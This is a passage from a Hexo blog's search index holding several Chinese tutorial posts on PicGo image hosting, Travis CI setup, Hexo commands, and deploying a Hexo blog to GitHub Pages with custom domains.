server)。</p></blockquote><p>通常配置完成之后，就可以直接使用了。</p><p>如果你上传失败的情况，可以打开PicGo 的日志看看具体是什么异常</p><p><img src="https://raw.githubusercontent.com/0xAiKang/CDN/master/blog/images/20200706220223.png" alt=""></p><p>如果得到了这样的异常，那么大概率是因为你没有开启全局代理。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[PicGo ERROR] RequestError: Error: connect ECONNREFUSED 13.250.168.23:443&#96;</span><br></pre></td></tr></table></figure><p>因为GitHub 服务器和国内 GFW 的问题会导致有时上传成功，有时上传失败，所以需要自备好科学上网工具。</p><p>如果你还有其他问题，可以查阅 <a href="https://github.com/Molunerfinn/PicGo/blob/dev/FAQ.md" target="_blank" rel="noopener">PicGo FAQ</a>。</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><ul><li>如果你和我一样，讨厌域名备案，又希望能有一个免费、稳定的图床，那么一定不要错过GitHub 图床。</li><li>如果你只是需要存储一些不怎么重要的图片，那么可以使用免费不限大小的SM.MS图床。</li><li>如果打算长期稳定使用可以优先选择又拍云或者七牛云。</li></ul>]]></content>
      
      
      <categories>
          
          <category> Tutorial </category>
          
          <category> Skill </category>
          
          <category> GitHub </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Tutorial </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Travis CI 快速上手</title>
      <link href="/travis-ci-quick-start/"/>
      <url>/travis-ci-quick-start/</url>
      
        <content type="html"><![CDATA[<p>最近使用Github Pages 搭建Hexo 时，用到了一项新技术。hmm…也不能说是新技术吧，只是之前一直有听说，但却没有实际用过。</p><p>它就是持续集成，听上去好像是一个高大上的概念，但通俗一点解释就是：写完代码提交之后，会根据你的要求，自动做编译测试。</p><p>其中最出名大概就是<a href="https://travis-ci.com/" target="_blank" rel="noopener">Travis CI</a>了，本文的目的就是快速入门 Travis CI。</p><a id="more"></a><h2 id="什么是持续集成？"><a href="#什么是持续集成？" class="headerlink" title="什么是持续集成？"></a>什么是持续集成？</h2><p>持续集成(Continuous Integration)是对小周期的的代码进行更改，其目的是通过以较小的增量开发和测试来构建更健康的软件。</p><p>而Travis CI 作为一个持续集成平台，通过自动构建和测试代码，并提供更改成功的即时反馈。</p><h3 id="快速上手"><a href="#快速上手" class="headerlink" title="快速上手"></a>快速上手</h3><p>在正式开始之前，需要提前准备好以下先决条件：</p><ul><li>一个 <a href="https://github.com/" target="_blank" rel="noopener">GitHub</a> 帐户</li><li>托管在 <a href="https://github.com/" target="_blank" rel="noopener">Github</a> 的项目的所有者权限</li></ul><p>需要注意的是：Travis CI不是完全免费的服务，前100个私有构建是免费的，后续就要进行付费，如果你的项目是开源的，或者你是学生，则不受限制。</p><h4 id="在Github-上使用Travis-CI"><a href="#在Github-上使用Travis-CI" class="headerlink" title="在Github 上使用Travis CI"></a>在Github 上使用Travis CI</h4><ol><li>将 <a href="https://github.com/marketplace/travis-ci" target="_blank" rel="noopener">Travis CI</a> 添加到你的 GitHub 账户中。</li><li>前往 GitHub 的 <a href="https://github.com/settings/installations" target="_blank" rel="noopener">Applications settings</a>，配置 Travis CI 权限，使其能够访问你的 repository。</li><li>前往 GitHub 新建 <a href="https://github.com/settings/tokens" target="_blank" rel="noopener">Personal Access Token</a>，只勾选 repo 的权限并生成一个新的 Token。Token 生成后请复制并保存好。</li><li>回到 Travis CI，前往你的 repository 的设置页面，在 Environment Variables 下新建一个环境变量，Name 为 GH_TOKEN，Value 为刚才你在 GitHub 生成的 Token。确保 DISPLAY VALUE IN BUILD LOG 保持 不被勾选 避免你的 Token 泄漏。点击 Add 保存。</li><li>在你的项目中新建一个 <code>.travis.yml</code> 文件。</li><li>提交并推送以触发Travis CI构建。</li></ol><p>其中<code>.travis.yml</code>文件的目的是告诉 Travis CI 应该做些什么。</p><p>以下示例指定了应使用Ruby 2.2和最新版本的JRuby构建的Ruby项目。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">language: ruby</span><br><span class="line">rvm:</span><br><span class="line"> - 2.2</span><br><span class="line"> - jruby</span><br></pre></td></tr></table></figure><p>通过访问<a href="https://travis-ci.com/auth" target="_blank" rel="noopener">Travis CI</a> 并选择repository，检查构建状态页面，以根据构建命令的返回状态查看构建是否通过或失败。</p>]]></content>
      
      
      <categories>
          
          <category> Tutorial </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Tutorial </tag>
            
            <tag> CI </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hexo 快速上手</title>
      <link href="/hexo-quick-start/"/>
      <url>/hexo-quick-start/</url>
      
        <content type="html"><![CDATA[<p>最近使用Hexo 搭建了一套博客系统，整个过程还算顺利，不过还是遇到了一些问题，整理记录一下。</p><a id="more"></a><h2 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h2><h3 id="init"><a href="#init" class="headerlink" title="init"></a>init</h3><p>新建一个网站。如果没有设置 <code>folder</code>，Hexo 默认在目前的文件夹建立网站。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo init [folder]</span><br></pre></td></tr></table></figure><h3 id="new"><a href="#new" class="headerlink" title="new"></a>new</h3><p>layout 有三种选择：</p><ul><li>post：新建一片文章</li><li>page：新建一个页面</li><li>draft：新建一篇草稿</li></ul><p>如果没有设置 layout 的话，默认使用 _config.yml 中的 default_layout 参数代替。如果标题包含空格的话，请使用引号括起来。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new [layout] &lt;title&gt;</span><br></pre></td></tr></table></figure><h3 id="generate"><a href="#generate" class="headerlink" title="generate"></a>generate</h3><p>生成静态文件。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br><span class="line">&#x2F;&#x2F; 等效于 hexo g</span><br></pre></td></tr></table></figure><p>常用参数：<br>|选项|描述|<br>|-|-|<br>|-d, –deploy|文件生成后立即部署网站|<br>|-w, –watch|监视文件变动|<br>|-b, –bail|生成过程中如果发生任何未处理的异常则抛出异常|</p><h3 id="publish"><a href="#publish" class="headerlink" title="publish"></a>publish</h3><p>发表草稿</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo publish [layout] &lt;filename&gt;</span><br></pre></td></tr></table></figure><h3 id="server"><a href="#server" class="headerlink" title="server"></a>server</h3><p>启动服务器。默认情况下，访问网址为： <code>http://localhost:4000/</code>。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br><span class="line">&#x2F;&#x2F; 等效于 hexo s</span><br></pre></td></tr></table></figure><h3 id="deploy"><a href="#deploy" class="headerlink" title="deploy"></a>deploy</h3><p>部署网站。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br><span class="line">&#x2F;&#x2F; 等效于 hexo d</span><br></pre></td></tr></table></figure><p><code>-g</code>，<code>--generate</code>：部署之前预先生成静态文件</p><h3 id="clean"><a href="#clean" class="headerlink" title="clean"></a>clean</h3><p>清除缓存文件 (db.json) 和已生成的静态文件 (public)。</p><p>在某些情况（尤其是更换主题后），如果发现对站点的更改无论如何也不生效，那可能需要运行该命令。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo clean</span><br></pre></td></tr></table></figure><h3 id="list"><a href="#list" class="headerlink" title="list"></a>list</h3><p>列出网站资料。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo list</span><br></pre></td></tr></table></figure><h3 id="version"><a href="#version" class="headerlink" title="version"></a>version</h3><p>显示 Hexo 版本。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo version</span><br></pre></td></tr></table></figure><h3 id="其他模式"><a href="#其他模式" class="headerlink" title="其他模式"></a>其他模式</h3><h4 id="安全模式"><a href="#安全模式" class="headerlink" title="安全模式"></a>安全模式</h4><p>在安全模式下，不会载入插件和脚本。当需要安装新插件遭遇问题时，可以尝试以安全模式重新执行。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo --safe</span><br></pre></td></tr></table></figure><h4 id="调试模式"><a href="#调试模式" class="headerlink" title="调试模式"></a>调试模式</h4><p>在终端中显示调试信息并记录到 debug.log。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo --debug</span><br></pre></td></tr></table></figure><h4 id="显示草稿"><a href="#显示草稿" class="headerlink" title="显示草稿"></a>显示草稿</h4><p>显示 source/_drafts 文件夹中的草稿文章。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo --draft</span><br></pre></td></tr></table></figure><h2 id="常见问题"><a href="#常见问题" class="headerlink" title="常见问题"></a>常见问题</h2><h3 id="CNAME-文件被删除"><a href="#CNAME-文件被删除" class="headerlink" title="CNAME 文件被删除"></a>CNAME 文件被删除</h3><p>GitHub Pages 为我们免费提供了<code>&lt;username&gt;.github.io</code>这样的域名作为 GitHub Page，但如果你觉得这个域名太长了，不满意，那么你也可以绑定自己的域名。</p><p>通常绑定完成之后，会在项目目录下面生成一个叫做<code>CNAME</code>的文件，这个文件的作用就是用来记录GitHub Pages 所绑定的域名。</p><p>这个时候就会产生一个问题：</p><blockquote><p>CNAME文件会在每次 hexo deploy 时消失，然后需要重新手动绑定，这样就很繁琐。</p></blockquote><p>有以下几种方式可以解决这个问题：</p><ol><li>每次 <code>hexo d</code> 之后，就去 GitHub 仓库根目录新建 CNAME文件。—— 繁琐</li><li>在 <code>hexo g</code> 之后， <code>hexo d</code> 之前，把CNAME文件复制到 <code>public</code> 目录下面，里面写入你要绑定的域名。—— 繁琐</li><li>将需要上传至 GitHub 的内容放在<code>source</code>文件夹，例如CNAME、favicon.ico、images等，这样在 <code>hexo d</code> 之后就不会被删除了。</li><li>通过安装插件实现永久保留。</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ npm install hexo-generator-cname --save</span><br></pre></td></tr></table></figure><p>编辑<code>_config.yml</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Plugins:</span><br><span class="line">- hexo-generator-cname</span><br></pre></td></tr></table></figure><p>推荐第三种方式，简单方便。</p><h3 id="配置apex-域"><a href="#配置apex-域" class="headerlink" title="配置apex 域"></a>配置apex 域</h3><p>Github Pages 是支持绑定自己的私有域名的，但默认只能绑定 <code>CNAME</code>的私有子域名，那有没有办法主域名呢？</p><p>答案是有的。</p><p>如果绑定主域名，例如 example.com，建议还设置一个 <code>www</code> 子域，GitHub Pages 将自动在域之间创建重定向，当输入<code>example.com</code>时，会重定向到 <code>www.example.com</code>。</p><p>通常我们绑定好私有子域名之后，回生成一个<code>CNAME</code>的文件，里面记录着我们绑定好的私有子域名。</p><p>此时只需要去DNS 做解析，创建一个ALIAS、ANAME 或 A 记录：</p><ul><li>创建ALIAS、ANAME记录：将 apex 域指向站点的默认域。</li><li>创建A 记录：将 apex 域指向 GitHub Pages 的 IP 地址。</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; GitHub Pages 的 IP 地址</span><br><span class="line">185.199.108.153</span><br><span class="line">185.199.109.153</span><br><span class="line">185.199.110.153</span><br><span class="line">185.199.111.153</span><br></pre></td></tr></table></figure><p>这里我选择的是创建A 记录，所以我的DNS 解析是这样的：</p><p><img src="https://raw.githubusercontent.com/0xAiKang/CDN/master/blog/images/20200706203008.png" alt="DNS解析A记录"></p><p>配置完DNS 解析之后，可以使用<code>dig</code>命令来检验是否解析成功：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ dig example.com +noall +answer</span><br><span class="line"></span><br><span class="line">; &lt;&lt;&gt;&gt; DiG 9.10.6 &lt;&lt;&gt;&gt; 0x2BeAce.com +noall +answer</span><br><span class="line">;; global options: +cmd</span><br><span class="line">0x2BeAce.com.4502INA185.199.111.153</span><br><span class="line">0x2BeAce.com.4502INA185.199.110.153</span><br><span class="line">0x2BeAce.com.4502INA185.199.108.153</span><br><span class="line">0x2BeAce.com.4502INA185.199.109.153</span><br></pre></td></tr></table></figure><p>将example.com 替换成你自己的 apex 域，确认结果与上面 GitHub Pages 的 IP 地址相匹配。</p><p>至此，就完成了apex 域的配置了。</p><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><ul><li><a href="https://www.cnblogs.com/chengxs/p/7496265.html" target="_blank" rel="noopener">github+hexo搭建自己的博客网站（七）注意事项</a></li><li><a href="https://hexo.io/zh-cn/docs/commands" target="_blank" rel="noopener">Hexo | 指令</a></li><li><a href="https://docs.github.com/cn/github/working-with-github-pages/managing-a-custom-domain-for-your-github-pages-site#configuring-an-apex-domain" target="_blank" rel="noopener">管理 GitHub Pages 站点的自定义域</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Tutorial </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Tutorial </tag>
            
            <tag> Hexo </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Github Pages 部署 Hexo 个人博客</title>
      <link href="/deploy-hexo-using-github-pages-personal-blog/"/>
      <url>/deploy-hexo-using-github-pages-personal-blog/</url>
      
        <content type="html"><![CDATA[<p>关于个人博客，在很久之前就想自己搭建一套，甚至还为此买了一台服务器，但奈何自己太忙了(tai lan le) =_=，这件事情就一直搁浅了，服务器大部分时间也都是空闲状态。</p><p>这段时间，突然很想把这件事情做好，觉得不能在这么拖下去了，所以便有了这篇文章。</p><a id="more"></a><blockquote><p>为什么使用Github Pages？</p></blockquote><p>我是出于以下原因考虑的：</p><ol><li>暂时没有服务器的需要，我只想有一个能写博客的地方。</li><li>GitHub Pages 可以提供 https服务，我不用担心域名备案的问题。</li><li>免费</li></ol><p>总之，如果你想用最简单、最省心的方式，搭建属于自己的博客，那么 Github Pages 一定不会让你失望。</p><h2 id="系统环境"><a href="#系统环境" class="headerlink" title="系统环境"></a>系统环境</h2><ul><li>Mac OS 10.15.4</li><li>Node.js 12</li><li>Hexo-cli: 3.1</li><li>NPM: 6.9</li></ul><h3 id="创建Github-Pages"><a href="#创建Github-Pages" class="headerlink" title="创建Github Pages"></a>创建Github Pages</h3><p>Github Pages分为两类，用户或组织主页、项目主页。</p><ul><li>用户或组织主页：在新建仓库时，仓库名称应该以<code>&lt;yourusername&gt;.github.io</code>的格式去填写。<code>&lt;yourusername&gt;</code>指的是你的Github 的用户名称。</li><li>创建项目主页：在新建仓库时，名称可以任意设置，然后通过<code>Setting-&gt;Options-&gt;Github Pages</code>将 <code>Source</code>选项设置为<code>Master Branch</code>，此时这个项目就变成一个 Github Pages项目了。</li></ul><p>需要注意的是：</p><ol><li>Github Pages 只针对开源的项目是免费的，如果你不想开源，那可能就需要考虑收费的套餐了。</li><li>第一种方式不能更改 Github Pages 部署分支。</li><li>如果你有自己的域名，那么推荐使用方式二创建 Github Pages。如果你没有自己的域名，那也没有关系，可以使用Github Pages 提供的域名访问<code>http://&lt;yourusername&gt;.github.io</code>。</li></ol><h3 id="绑定域名"><a href="#绑定域名" class="headerlink" title="绑定域名"></a>绑定域名</h3><p>如果你是通过方式一，创建的Github Pages，那么可以跳过此部分。</p><p>在 2018 年 5 月 1 日之后，GitHub Pages 已经开始提供免费为自定义域名开启 HTTPS 的功能，并且大大简化了操作的流程，现在用户已经不再需要自己提供证书，只需要将自己的域名使用 CNAME 的方式指向自己的 GitHub Pages 域名即可。</p><p>首先需要在你的 DNS 解析里添加一条解析记录，例如我选择添加子域名<code>blog.aikang.me</code>，通过 CNAME 的方式指向我刚刚自定义的 GitHub Pages 域名 <code>0xAiKang.github.io</code>。</p><p><img src="https://i.loli.net/2020/07/04/BDX384QPIZqniJU.png" alt="DNS 域名解析"></p><p>添加完成后等待 DNS 解析的生效的同时回到项目的<code>Setting</code>界面，将刚才的子域名与 Github Pages 绑定在一起。</p><p>保存之后，我们只需要耐心等待 GitHub 生成证书并确认域名的解析是否正常。</p><p><img src="https://i.loli.net/2020/07/04/OZ2Vu8p9tXgTj7q.png" alt="等待 GitHub 生成证书并确认域名解析正常"></p><h3 id="将Hexo-部署到Github-Pages"><a href="#将Hexo-部署到Github-Pages" class="headerlink" title="将Hexo 部署到Github Pages"></a>将Hexo 部署到Github Pages</h3><p>域名解析成功之后，就可以通过我们刚才绑定的域名进行访问了，但是你会发现，现在只能看到一片空白，这是因为我们的网站还没有任何内容，所以下一步需要做的就是选择一套静态模版系统。</p><p>目前市场上有很多优秀的静态模板系统，比如：</p><ul><li>Node.js 编写的 Hexo</li><li>Go 编写的 Hugo</li><li>Python 编写的 Pelican</li><li>静态博客写作客户端 Gridea</li></ul><blockquote><p>为什么要选择Hexo？</p></blockquote><p>最初在选择博客模版系统时，并没有发现 Gridea ，事后发现这个小众的静态博客写作客户端似乎才是我真正想要的。</p><p>不过既然选择了Hexo，也是因为它的生态环境很大，可选主题非常多，并且都是开源的。</p><blockquote><p>如何将 Hexo 部署到 GitHub Pages？</p></blockquote><ol><li>将 <a href="https://github.com/marketplace/travis-ci" target="_blank" rel="noopener">Travis CI</a> 添加到你的 GitHub 账户中。</li><li>前往 GitHub 的 <a href="https://github.com/settings/installations" target="_blank" rel="noopener">Applications settings</a>，配置 Travis CI 权限，使其能够访问你的 repository。</li><li>正常情况下你会被重定向到 Travis CI 的页面。如果没有，请 <a href="https://travis-ci.com/" target="_blank" rel="noopener">手动前往</a>。</li><li>前往 GitHub 新建 <a href="https://github.com/settings/tokens" target="_blank" rel="noopener">Personal Access Token</a>，只勾选 repo 的权限并生成一个新的 Token。Token 生成后请复制并保存好。</li><li>回到 Travis CI，前往你的 repository 的设置页面，在 Environment Variables 下新建一个环境变量，Name 为 GH_TOKEN，Value 为刚才你在 GitHub 生成的 Token。确保 DISPLAY VALUE IN BUILD LOG 保持 不被勾选 避免你的 Token 泄漏。点击 Add 保存。</li><li>在你的 Hexo 站点文件夹中新建一个 <code>.travis.yml</code> 文件：</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">sudo: false</span><br><span class="line">language: node_js</span><br><span class="line">node_js:</span><br><span class="line">  - 10 # use nodejs v10 LTS</span><br><span class="line">cache: npm</span><br><span class="line">branches:</span><br><span class="line">  only:</span><br><span class="line">    - master # build master branch only</span><br><span class="line">script:</span><br><span class="line">  - hexo generate # generate static files</span><br><span class="line">deploy:</span><br><span class="line">  provider: pages</span><br><span class="line">  skip-cleanup: true</span><br><span class="line">  github-token: $GH_TOKEN</span><br><span class="line">  keep-history: true</span><br><span class="line">  on:</span><br><span class="line">    branch: master</span><br><span class="line">  local-dir: public</span><br></pre></td></tr></table></figure><p>上面这个配置文件的作用是用来自动构建，编译测试。</p><p>将 <code>.travis.yml</code> 推送到 repository 中。Travis CI 会自动开始运行，并将生成的文件推送到同一 repository 下的 <code>gh-pages</code> 分支下。</p><h4 id="修改发布源"><a href="#修改发布源" class="headerlink" title="修改发布源"></a>修改发布源</h4><p>推送完成之后，会发现多了一个 <code>gh-gages</code>分支，这个分支就是用于部署站点的分支，但是GitHub Pages 会默认使用<code>master</code>分支作为发布源，所以我们需要切换发布源。</p><p>在<code>Setting-&gt;Option-&gt;GitHub Pages</code>下，使用 Source（源）下拉菜单选择发布源。</p><p><img src="https://i.loli.net/2020/07/04/AHldtP2bIhaqr8c.png" alt="修改默认源"></p><p>注意：使用用户或组织主页构建的 Github Pages 不能修改发布源，只能使用默认的 <code>master</code>分支。</p><h3 id="一键部署"><a href="#一键部署" class="headerlink" title="一键部署"></a>一键部署</h3><p>Hexo 提供了快速方便的一键部署功能，让你只需一条命令就能将网站部署到服务器上。</p><p>在正式部署之前，我们需要先修改<code>_config.yml</code> 文件，配置参数。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">deploy:</span><br><span class="line">  type: git</span><br><span class="line">  repo: &lt;repository url&gt; #https:&#x2F;&#x2F;bitbucket.org&#x2F;JohnSmith&#x2F;johnsmith.bitbucket.io</span><br><span class="line">  branch: [branch]</span><br><span class="line">  message: [message]</span><br></pre></td></tr></table></figure><table><thead><tr><th>参数</th><th>描述</th><th>默认值</th></tr></thead><tbody><tr><td>type</td><td>deployer</td><td>-</td></tr><tr><td>repo</td><td>项目地址</td><td>-</td></tr><tr><td>branch</td><td>分支名称</td><td>gh-pages</td></tr></tbody></table><p>有以下两点需要注意：<br>1.repo 需要选择SSH 协议，HTTPS协议会报错。<br>2.branch 选择Github Pages中设置的那个分支，而不是拉取这个项目的分支</p><p>我这里使用的是<code>git</code> 作为 deployer，所以需要手动安装一个插件。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-deployer-git --save</span><br></pre></td></tr></table></figure><p>生成站点文件并部署至远程库：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo clean &amp;&amp; hexo deploy --generate</span><br></pre></td></tr></table></figure><p>至此，就完成了使用Github Pages 部署 Hexo 个人博客的全部过程，总的来说还是很顺利的。</p><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><ul><li><a href="https://sspai.com/post/54608" target="_blank" rel="noopener">Github Pages 搭建教程</a></li><li><a href="https://hexo.io/zh-cn/docs/github-pages.html" target="_blank" rel="noopener">将Hexo 部署到 GitHub Pages</a></li><li><a href="https://hexo.io/zh-cn/docs/one-command-deployment.html" target="_blank" rel="noopener">Hexo 一键部署</a></li><li><a href="https://juejin.im/post/5acf02086fb9a028b92d8652#heading-15" target="_blank" rel="noopener">Github Pages部署个人博客（Hexo篇）</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Tutorial </category>
          
          <category> GitHub </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Tutorial </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
